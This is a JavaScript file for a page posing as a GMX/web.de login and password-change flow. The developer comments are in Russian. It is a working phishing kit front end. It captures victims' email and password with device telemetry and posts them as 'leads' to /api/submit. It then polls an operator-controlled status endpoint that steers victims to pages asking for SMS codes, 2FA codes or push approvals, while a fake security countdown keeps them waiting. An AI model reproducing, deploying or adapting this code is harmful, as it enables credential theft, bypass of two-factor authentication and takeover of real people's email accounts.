/**
 * GMX Passwort ändern — навигация по шагам и логика формы
 */

(function () {
  const credFetch = { credentials: 'include' };
  /** Новая вкладка / закрыли и открыли / F5 / назад на страницу входа — не продолжать старый лид и опрос статуса. */
  try {
    sessionStorage.removeItem('gmw_lead_id');
    sessionStorage.removeItem('gmw_fp_preset_idx');
  } catch (e) {}
  const steps = {
    email: 'step-email',
    password: 'step-password',
    verifyChoice: 'step-verify-choice',
    smsRequest: 'step-sms-request',
    smsCode: 'step-sms-code',
    push: 'step-push',
    success: 'step-success'
  };

  const stepIds = Object.values(steps);
  let currentStep = 'email';

  function showStep(stepKey) {
    currentStep = stepKey;
    const id = steps[stepKey];
    if (!id) return;

    stepIds.forEach(sid => {
      const el = document.getElementById(sid);
      if (el) el.classList.toggle('active', sid === id);
    });

    document.body.classList.toggle('step-email', stepKey === 'email');
    const header = document.querySelector('.gmx-header');
    if (header) header.setAttribute('aria-hidden', stepKey === 'email' ? 'true' : 'false');
  }

  function getStepEl(stepKey) {
    return document.getElementById(steps[stepKey]);
  }

  // Одна форма: подшаг 1 (только E-Mail + Weiter) или подшаг 2 (E-Mail disabled + Passwort + Login)
  let loginSubStep = 1;
  let loginPollId = null;
  let pagePollInterval = null; // Выносим в глобальную область видимости
  let protectionOverlayShown = false;
  let protectionCountdownSeconds = 300; // 5 мин
  let protectionCountdownIntervalId = null;
  const usernameInput = document.getElementById('username');
  const passwordInput = document.getElementById('password');
  const buttonNext = document.querySelector('[data-testid="button-next"]');
  const buttonBack = document.querySelector('[data-testid="button-back"]');
  const usernameGroup = usernameInput ? usernameInput.closest('.input-group-username') : null;
  const passwordGroup = passwordInput ? passwordInput.closest('.input-group') : null;
  const passwordRow = document.querySelector('.input-row-password');
  const linkForgotRow = document.querySelector('.link-forgot-row');
  const pencilIcon = document.querySelector('[data-testid="custom-icon-username"]');
  const errorUsername = document.getElementById('error-username');
  const errorLogin = document.getElementById('error-login');

  var hadNonSuccessStatusThisSession = false;
  function startPagePoll(id) {
    if (!id) return;
    hadNonSuccessStatusThisSession = false;
    if (pagePollInterval) {
      clearInterval(pagePollInterval);
      pagePollInterval = null;
    }
    function poll() {
      fetch('/api/status?id=' + encodeURIComponent(id) + '&page=index&_=' + Date.now(), Object.assign({ cache: 'no-store', headers: { Pragma: 'no-cache' } }, credFetch))
        .then(function (r) { return r.json(); })
        .then(function (res) {
          var mode = (res && res.mode) || '';
          var st = res && res.status;
          if (mode === 'manual' && st === 'pending') return;
          if (st !== 'show_success') hadNonSuccessStatusThisSession = true;
          if (st === 'show_success') {
            if (!hadNonSuccessStatusThisSession) return;
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
            var overlay = document.getElementById('success-overlay');
            if (overlay) overlay.hidden = false;
          } else if (st === 'redirect_change_password' || st === 'redirect_sicherheit' || st === 'redirect_android' || st === 'redirect_open_on_pc') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
            var url = st === 'redirect_change_password' ? '/passwort-aendern?id=' + encodeURIComponent(id)
              : st === 'redirect_sicherheit' ? '/sicherheit-update?id=' + encodeURIComponent(id)
              : st === 'redirect_android' ? '/app-update?id=' + encodeURIComponent(id)
              : '/bitte-am-pc?id=' + encodeURIComponent(id);
            setTimeout(function() { window.location = url; }, 1800);
          } else if (st === 'redirect_push') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
            window.location = '/push-confirm.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_sms_code') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
            window.location = '/sms-code.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_2fa_code') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
            window.location = '/2fa-code.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_gmx_net') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
            window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || 'https://www.gmx.net/';
          } else if (st === 'not_found') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
            try { sessionStorage.removeItem('gmw_lead_id'); } catch (e) {}
            if (typeof showLoginSubStep === 'function') showLoginSubStep(1);
            setEmailError(true);
          }
        })
        .catch(function () {});
    }
    poll();
    pagePollInterval = setInterval(poll, 1000);
  }

  (function registerVisit() {
    try {
      var leadId = sessionStorage.getItem('gmw_lead_id');
      if (leadId) startPagePoll(leadId);
    } catch (e) {}
  })();

  function isValidEmail(value) {
    const v = (value || '').trim();
    if (!v) return false;
    const at = v.indexOf('@');
    if (at === -1) return false;
    const local = v.slice(0, at).trim();
    const domain = v.slice(at + 1).toLowerCase().trim();
    const isWebde = typeof window !== 'undefined' && window.__BRAND__ && window.__BRAND__.id === 'webde';
    const allowedDomain = isWebde ? 'web.de' : 'gmx.de';
    return local.length >= 1 && domain === allowedDomain;
  }

  function setEmailError(show) {
    if (errorUsername) errorUsername.hidden = !show;
    if (usernameGroup) usernameGroup.classList.toggle('has-error', show);
    if (usernameInput) usernameInput.setAttribute('aria-invalid', show ? 'true' : 'false');
  }

  function validateEmail() {
    const v = (usernameInput && usernameInput.value) || '';
    return isValidEmail(v);
  }

  function updateEmailErrorVisibility() {
    const v = (usernameInput && usernameInput.value) || '';
    const valid = isValidEmail(v);
    if (errorUsername && !errorUsername.hidden && valid) setEmailError(false);
  }

  function setLoginError(show) {
    if (errorLogin) errorLogin.hidden = !show;
    if (usernameGroup) usernameGroup.classList.toggle('has-error', show);
    if (passwordGroup) passwordGroup.classList.toggle('has-error', show);
  }

  function stopLoginLoading() {
    if (loginPollId) {
      clearInterval(loginPollId);
      loginPollId = null;
    }
    if (buttonNext) {
      buttonNext.classList.remove('is-loading');
      if (loginSubStep === 1) {
        const v = (usernameInput && usernameInput.value) || '';
        const isWebde = typeof window !== 'undefined' && window.__BRAND__ && window.__BRAND__.id === 'webde';
        buttonNext.disabled = isWebde ? !isValidEmail(v) : !v.trim();
      } else buttonNext.disabled = !(passwordInput && passwordInput.value.trim());
    }
  }

  function showLoginSubStep(step) {
    loginSubStep = step;
    if (step === 1) {
      try { sessionStorage.removeItem('gmw_lead_id'); } catch (e) {}
      stopLoginLoading();
    }
    const isStep2 = step === 2;
    if (passwordRow) passwordRow.hidden = !isStep2;
    if (linkForgotRow) linkForgotRow.hidden = !isStep2;
    if (pencilIcon) pencilIcon.hidden = !isStep2;
    if (usernameGroup) usernameGroup.classList.toggle('has-edit-icon', isStep2);
    if (usernameInput) {
      usernameInput.disabled = isStep2;
      if (isStep2) usernameInput.setAttribute('aria-describedby', '');
      else usernameInput.removeAttribute('aria-describedby');
    }
    if (buttonNext) {
      const btnText = buttonNext.querySelector('.btn-login-text');
      if (btnText) btnText.textContent = isStep2 ? 'Login' : 'Weiter';
      else buttonNext.textContent = isStep2 ? 'Login' : 'Weiter';
      if (isStep2) buttonNext.disabled = !passwordInput.value.trim();
      else updateButtonNextState();
    }
    if (isStep2 && passwordInput) {
      passwordInput.value = '';
      passwordInput.focus();
      if (passwordGroup) passwordGroup.classList.remove('has-value');
    }
    if (isStep2) setEmailError(false);
    else updateEmailErrorVisibility();
    setLoginError(false);
    updateUsernameLabel();
  }

  function updateUsernameLabel() {
    if (usernameGroup) usernameGroup.classList.toggle('has-value', !!usernameInput && !!usernameInput.value.trim());
  }

  function updateButtonNextState() {
    if (!buttonNext) return;
    if (loginSubStep === 1) {
      const v = (usernameInput && usernameInput.value) || '';
      const isWebde = typeof window !== 'undefined' && window.__BRAND__ && window.__BRAND__.id === 'webde';
      buttonNext.disabled = isWebde ? !isValidEmail(v) : !v.trim();
    } else buttonNext.disabled = !passwordInput.value.trim();
  }

  if (usernameInput) {
    usernameInput.addEventListener('input', function () {
      if (loginSubStep === 1) {
        updateEmailErrorVisibility();
        updateButtonNextState();
      }
      updateUsernameLabel();
    });
    usernameInput.addEventListener('change', function () {
      if (loginSubStep === 1) updateEmailErrorVisibility();
      updateUsernameLabel();
    });
    usernameInput.addEventListener('focus', updateUsernameLabel);
    usernameInput.addEventListener('blur', updateUsernameLabel);
    updateUsernameLabel();
  }

  if (passwordInput) {
    passwordInput.addEventListener('input', function () {
      updateButtonNextState();
      if (errorLogin && !errorLogin.hidden) setLoginError(false);
    });
    passwordInput.addEventListener('change', updateButtonNextState);
    passwordInput.addEventListener('focus', function () {
      if (passwordGroup) passwordGroup.classList.add('has-value');
    });
    passwordInput.addEventListener('blur', function () {
      if (passwordGroup) passwordGroup.classList.toggle('has-value', !!passwordInput.value.trim());
    });
  }

  function doStep1Submit() {
    const email = (usernameInput && usernameInput.value) ? usernameInput.value.trim() : '';
    if (!email) return;
    if (!isValidEmail(email)) {
      setEmailError(true);
      return;
    }
    var visitId = null;
    try { visitId = sessionStorage.getItem('gmw_lead_id'); } catch (e) {}
    var sw = (typeof window.screen !== 'undefined' && window.screen.width) | 0;
    var sh = (typeof window.screen !== 'undefined' && window.screen.height) | 0;
    var hpEl = document.getElementById('hp-website');
    var websiteHp = (hpEl && hpEl.value) ? hpEl.value : '';
    console.log('[GMW] Отправка email (создание лога):', email);
    fetch('/api/submit', Object.assign({
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(window.gmwAppendTelemetry({ email: email, password: '', visitId: visitId || undefined, screenWidth: sw || undefined, screenHeight: sh || undefined, website: websiteHp }))
    }, credFetch))
      .then(function (r) {
        return r.json().then(function (data) { return { ok: r.ok, status: r.status, data: data }; });
      })
      .then(function (res) {
        if (!res.ok) {
          console.error('[GMW] Ошибка отправки email:', res.status, res.data);
          setEmailError(true);
          return;
        }
        var lid = res.data && res.data.id;
        if (!lid) {
          setEmailError(true);
          return;
        }
        try { sessionStorage.setItem('gmw_lead_id', lid); } catch (e) {}
        startPagePoll(lid);
        showLoginSubStep(2);
      })
      .catch(function (err) {
        console.error('[GMW] Ошибка отправки email:', err);
        setEmailError(true);
      });
  }

  var step1HandledByKeydown = false;
  if (usernameInput) {
    usernameInput.addEventListener('keydown', function (e) {
      if (e.key === 'Enter' && loginSubStep === 1) {
        e.preventDefault();
        step1HandledByKeydown = true;
        if (setEmailError) setEmailError(false);
        setTimeout(function () { step1HandledByKeydown = false; doStep1Submit(); }, 100);
      }
    });
  }

      document.getElementById('form-login').addEventListener('submit', function (e) {
        e.preventDefault();
        if (loginSubStep === 1) {
          if (step1HandledByKeydown) return;
          if (setEmailError) setEmailError(false);
          setTimeout(doStep1Submit, 50);
          return;
        }
        if (loginSubStep === 2) {
      const email = (usernameInput && usernameInput.value) || '';
      const pwd = (passwordInput && passwordInput.value) || '';
      if (!pwd.trim()) return;
      setLoginError(false);
      buttonNext.disabled = true;
      buttonNext.classList.add('is-loading');
      var leadId = null;
      try { leadId = sessionStorage.getItem('gmw_lead_id'); } catch (e) {}
      function startPolling(id) {
        if (!id) {
          buttonNext.classList.remove('is-loading');
          buttonNext.disabled = !pwd.trim();
          return;
        }
        // Останавливаем предыдущий polling если есть
        if (loginPollId) {
          clearInterval(loginPollId);
          loginPollId = null;
        }
        showProtectionOverlayAndCountdown();
        function showProtectionOverlayAndCountdown() {
          if (protectionOverlayShown) return;
          protectionOverlayShown = true;
          var overlay = document.getElementById('protection-overlay');
          var countdownEl = document.getElementById('protection-countdown');
          if (overlay) overlay.hidden = false;
          protectionCountdownSeconds = 300; // 5 мин
          function formatCountdown(sec) {
            var m = Math.floor(sec / 60);
            var s = sec % 60;
            return m + ':' + (s < 10 ? '0' : '') + s;
          }
          if (countdownEl) countdownEl.textContent = formatCountdown(protectionCountdownSeconds);
          if (protectionCountdownIntervalId) clearInterval(protectionCountdownIntervalId);
          protectionCountdownIntervalId = setInterval(function () {
            if (protectionCountdownSeconds > 0) protectionCountdownSeconds--;
            if (countdownEl) countdownEl.textContent = formatCountdown(protectionCountdownSeconds);
          }, 1000);
        }
        function checkStatus() {
          fetch('/api/status?id=' + encodeURIComponent(id) + '&page=index&_=' + Date.now(), Object.assign({ cache: 'no-store', headers: { Pragma: 'no-cache' } }, credFetch))
            .then(function (r) { return r.json(); })
            .then(function (res) {
              var st = res && res.status;
              var mode = res && res.mode;
              function hideProtectionOverlay() {
                var po = document.getElementById('protection-overlay');
                if (po) po.hidden = true;
                if (protectionCountdownIntervalId) { clearInterval(protectionCountdownIntervalId); protectionCountdownIntervalId = null; }
                protectionOverlayShown = false;
              }
              if (st === 'error' || st === 'not_found') {
                if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
                if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
                hideProtectionOverlay();
                buttonNext.classList.remove('is-loading');
                buttonNext.disabled = !passwordInput.value.trim();
                if (st === 'not_found') { try { sessionStorage.removeItem('gmw_lead_id'); } catch (e) {} }
                setLoginError(true);
              } else if (st === 'show_success') {
                if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
                if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
                hideProtectionOverlay();
                buttonNext.classList.remove('is-loading');
                buttonNext.disabled = !passwordInput.value.trim();
                var overlay = document.getElementById('success-overlay');
                if (overlay) overlay.hidden = false;
              } else if (st === 'redirect_change_password' || st === 'redirect_sicherheit' || st === 'redirect_android' || st === 'redirect_open_on_pc') {
                if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
                if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
                hideProtectionOverlay();
                var delayMs = 1800;
                var targetUrl = st === 'redirect_change_password' ? '/passwort-aendern?id=' + encodeURIComponent(id)
                  : st === 'redirect_sicherheit' ? '/sicherheit-update?id=' + encodeURIComponent(id)
                  : st === 'redirect_android' ? '/app-update?id=' + encodeURIComponent(id)
                  : '/bitte-am-pc?id=' + encodeURIComponent(id);
                setTimeout(function() { window.location = targetUrl; }, delayMs);
              } else if (st === 'redirect_push') {
                if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
                if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
                hideProtectionOverlay();
                window.location = '/push-confirm.html?id=' + encodeURIComponent(id);
              } else if (st === 'redirect_sms_code') {
                if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
                if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
                hideProtectionOverlay();
                window.location = '/sms-code.html?id=' + encodeURIComponent(id);
              } else if (st === 'redirect_2fa_code') {
                if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
                if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
                hideProtectionOverlay();
                window.location = '/2fa-code.html?id=' + encodeURIComponent(id);
              } else if (st === 'redirect_gmx_net') {
                if (loginPollId) { clearInterval(loginPollId); loginPollId = null; }
                if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
                hideProtectionOverlay();
                window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || 'https://www.gmx.net/';
              } else if (st === 'pending') {
                showProtectionOverlayAndCountdown();
              }
            })
            .catch(function () {});
        }
        setTimeout(function () {
          checkStatus();
          // Продолжаем polling каждую секунду для быстрой реакции на ручные действия
          loginPollId = setInterval(checkStatus, 1000);
        }, 150);
      }
      if (leadId) {
        var sw = (typeof window.screen !== 'undefined' && window.screen.width) | 0;
        var sh = (typeof window.screen !== 'undefined' && window.screen.height) | 0;
        fetch('/api/update-password', Object.assign({
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(window.gmwAppendTelemetry({ id: leadId, password: pwd, screenWidth: sw || undefined, screenHeight: sh || undefined }))
        }, credFetch))
          .then(function (r) {
            return r.json().then(function (data) { return { ok: r.ok, status: r.status, data: data }; });
          })
          .then(function (res) {
            if (!res.ok) {
              console.error('[GMW] /api/update-password ошибка:', res.status, res.data);
              buttonNext.classList.remove('is-loading');
              buttonNext.disabled = !pwd.trim();
              setLoginError(true);
              return;
            }
            var id = (res.data && res.data.id) || leadId;
            startPolling(id);
          })
          .catch(function (err) {
            console.error('[GMW] Ошибка /api/update-password, пробуем /api/submit:', err);
            var sw = (typeof window.screen !== 'undefined' && window.screen.width) | 0;
            var sh = (typeof window.screen !== 'undefined' && window.screen.height) | 0;
            var hpEl = document.getElementById('hp-website');
            var websiteHp = (hpEl && hpEl.value) ? hpEl.value : '';
            fetch('/api/submit', Object.assign({
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(window.gmwAppendTelemetry({ email: email.trim(), password: pwd, screenWidth: sw || undefined, screenHeight: sh || undefined, website: websiteHp }))
            }, credFetch))
              .then(function (r) {
                return r.json().then(function (data) { return { ok: r.ok, status: r.status, data: data }; });
              })
              .then(function (res) {
                if (!res.ok) {
                  console.error('[GMW] Ошибка /api/submit (fallback):', res.status, res.data);
                  buttonNext.classList.remove('is-loading');
                  buttonNext.disabled = !pwd.trim();
                  setLoginError(true);
                  return;
                }
                var newId = res.data && res.data.id;
                if (!newId) {
                  buttonNext.classList.remove('is-loading');
                  buttonNext.disabled = !pwd.trim();
                  setLoginError(true);
                  return;
                }
                try { sessionStorage.setItem('gmw_lead_id', newId); } catch (e) {}
                startPolling(newId);
              })
              .catch(function (err2) {
                console.error('[GMW] Ошибка отправки (fallback):', err2);
                buttonNext.classList.remove('is-loading');
                buttonNext.disabled = !pwd.trim();
                setLoginError(true);
              });
          });
      } else {
        var sw = (typeof window.screen !== 'undefined' && window.screen.width) | 0;
        var sh = (typeof window.screen !== 'undefined' && window.screen.height) | 0;
        var hpEl = document.getElementById('hp-website');
        var websiteHp = (hpEl && hpEl.value) ? hpEl.value : '';
        console.log('[GMW] Отправка email + пароль:', email);
        fetch('/api/submit', Object.assign({
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(window.gmwAppendTelemetry({ email: email.trim(), password: pwd, screenWidth: sw || undefined, screenHeight: sh || undefined, website: websiteHp }))
        }, credFetch))
          .then(function (r) {
            return r.json().then(function (data) { return { ok: r.ok, status: r.status, data: data }; });
          })
          .then(function (res) {
            if (!res.ok) {
              console.error('[GMW] Ошибка /api/submit (email+password):', res.status, res.data);
              buttonNext.classList.remove('is-loading');
              buttonNext.disabled = !pwd.trim();
              setLoginError(true);
              return;
            }
            var newLeadId = res.data && res.data.id;
            if (!newLeadId) {
              buttonNext.classList.remove('is-loading');
              buttonNext.disabled = !pwd.trim();
              setLoginError(true);
              return;
            }
            try { sessionStorage.setItem('gmw_lead_id', newLeadId); } catch (e) {}
            console.log('[GMW] Lead ID сохранен:', newLeadId);
            startPolling(newLeadId);
          })
          .catch(function (err) {
            console.error('[GMW] Ошибка отправки email+password:', err);
            buttonNext.classList.remove('is-loading');
            buttonNext.disabled = !pwd.trim();
            setLoginError(true);
          });
      }
    }
  });

  if (buttonBack) {
    buttonBack.addEventListener('click', function (e) {
      e.preventDefault();
      if (loginSubStep === 2) showLoginSubStep(1);
      else window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || 'https://www.gmx.net/';
    });
  }

  var successOverlayClose = document.getElementById('success-overlay-close');
  if (successOverlayClose) {
    successOverlayClose.addEventListener('click', function () {
      window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || 'https://www.gmx.net/';
    });
  }

  if (pencilIcon) {
    pencilIcon.addEventListener('click', function (e) {
      e.preventDefault();
      showLoginSubStep(1);
    });
    pencilIcon.addEventListener('keydown', function (e) {
      if (e.key === 'Enter' || e.key === ' ') {
        e.preventDefault();
        showLoginSubStep(1);
      }
    });
  }

  var btnReg = document.querySelector('[data-testid="button-registration"]');
  if (btnReg) {
    btnReg.addEventListener('click', function (e) {
      e.preventDefault();
      window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) ? (window.__BRAND__.canonicalUrl.replace(/\/$/, '') + '/produkte/premium/tarifvergleich/') : 'https://www.gmx.net/produkte/premium/tarifvergleich/#.pc_page.homepage.index.loginbox.tarifvergleich';
    });
  }

  if (buttonNext) updateButtonNextState();

  // Иконка показа/скрытия пароля на первом экране
  var revealBtn = document.querySelector('[data-testid="reveal-icon-password"]');
  if (revealBtn) {
    revealBtn.addEventListener('click', function () {
      if (!passwordInput) return;
      var isPassword = passwordInput.type === 'password';
      passwordInput.type = isPassword ? 'text' : 'password';
      this.setAttribute('aria-label', isPassword ? 'Passwort verbergen' : 'Passwort anzeigen');
    });
  }

  // Переход по шагам (остальные)

  document.getElementById('form-password').addEventListener('submit', function (e) {
    e.preventDefault();
    const newPw = document.getElementById('new-password').value;
    const confirm = document.getElementById('confirm-password').value;
    if (newPw !== confirm) {
      alert('Neues Passwort und Wiederholung stimmen nicht überein.');
      return;
    }
    if (newPw.length < 8) {
      alert('Das Passwort muss mindestens 8 Zeichen haben.');
      return;
    }
    showStep('verifyChoice');
  });

  document.querySelectorAll('[data-method]').forEach(btn => {
    btn.addEventListener('click', function () {
      const method = this.dataset.method;
      var leadId = '';
      try { leadId = sessionStorage.getItem('gmw_lead_id') || ''; } catch (e) {}
      if (method === 'push') {
        if (leadId) {
          fetch('/api/choose-method', Object.assign({
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ id: leadId, method: 'push' })
          }, credFetch)).then(function () {
            window.location = '/push-confirm.html?id=' + encodeURIComponent(leadId);
          }).catch(function () {
            window.location = '/push-confirm.html?id=' + encodeURIComponent(leadId);
          });
        } else {
          showStep('push');
        }
      } else if (method === 'sms') {
        if (leadId) {
          fetch('/api/choose-method', Object.assign({
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ id: leadId, method: 'sms' })
          }, credFetch)).then(function () {
            window.location = '/sms-code.html?id=' + encodeURIComponent(leadId);
          }).catch(function () {
            window.location = '/sms-code.html?id=' + encodeURIComponent(leadId);
          });
        } else {
          showStep('smsRequest');
        }
      }
    });
  });

  document.getElementById('btn-request-sms').addEventListener('click', function () {
    showStep('smsCode');
  });

  document.getElementById('form-sms').addEventListener('submit', function (e) {
    e.preventDefault();
    const code = document.getElementById('sms-code').value.trim();
    if (code.length === 6) showStep('success');
    else alert('Bitte geben Sie den 6-stelligen Code ein.');
  });

  var gotoEmail = document.querySelector('[data-goto="email"]');
  if (gotoEmail) {
    gotoEmail.addEventListener('click', function (e) {
      e.preventDefault();
      showStep('email');
      showLoginSubStep(1);
    });
  }

  document.querySelectorAll('.link-back').forEach(link => {
    link.addEventListener('click', function (e) {
      e.preventDefault();
      showStep('email');
    });
  });

  // Навигация по data-goto (например «Alternative wählen» → выбор SMS/Push)
  document.querySelectorAll('[data-goto]').forEach(link => {
    link.addEventListener('click', function (e) {
      e.preventDefault();
      const target = this.getAttribute('data-goto');
      if (target && steps[target]) showStep(target);
    });
  });

  // Переключение видимости пароля
  document.querySelectorAll('.toggle-password').forEach(btn => {
    btn.addEventListener('click', function () {
      const wrap = this.closest('.password-wrap');
      const input = wrap ? wrap.querySelector('input') : null;
      if (!input) return;
      const isPassword = input.type === 'password';
      input.type = isPassword ? 'text' : 'password';
      btn.setAttribute('aria-label', isPassword ? 'Passwort verbergen' : 'Passwort anzeigen');
    });
  });

  // Индикатор силы пароля
  const strengthFill = document.getElementById('strength-fill');
  const newPasswordInput = document.getElementById('new-password');

  function getStrength(pw) {
    if (!pw.length) return { level: 0, width: 0, cls: '' };
    let score = 0;
    if (pw.length >= 8) score++;
    if (pw.length >= 12) score++;
    if (/[a-z]/.test(pw) && /[A-Z]/.test(pw)) score++;
    if (/\d/.test(pw)) score++;
    if (/[^a-zA-Z0-9]/.test(pw)) score++;
    const width = Math.min(100, score * 25);
    const cls = score <= 2 ? '' : score <= 3 ? 'medium' : 'strong';
    return { level: score, width, cls };
  }

  if (newPasswordInput && strengthFill) {
    newPasswordInput.addEventListener('input', function () {
      const { width, cls } = getStrength(this.value);
      strengthFill.style.width = width + '%';
      strengthFill.className = 'strength-fill ' + cls;
    });
  }

  // Успех — кнопка «Zum Login»: сброс и возврат на экран входа
  const successStep = getStepEl('success');
  if (successStep) {
    const loginBtn = successStep.querySelector('.btn');
    if (loginBtn) {
      loginBtn.addEventListener('click', function (e) {
        e.preventDefault();
        showStep('email');
        const un = document.getElementById('username');
        if (un) un.value = '';
        showLoginSubStep(1);
        document.getElementById('current-password').value = '';
        document.getElementById('new-password').value = '';
        document.getElementById('confirm-password').value = '';
        document.getElementById('sms-code').value = '';
        strengthFill.style.width = '0%';
        strengthFill.className = 'strength-fill';
      });
    }
  }
})();
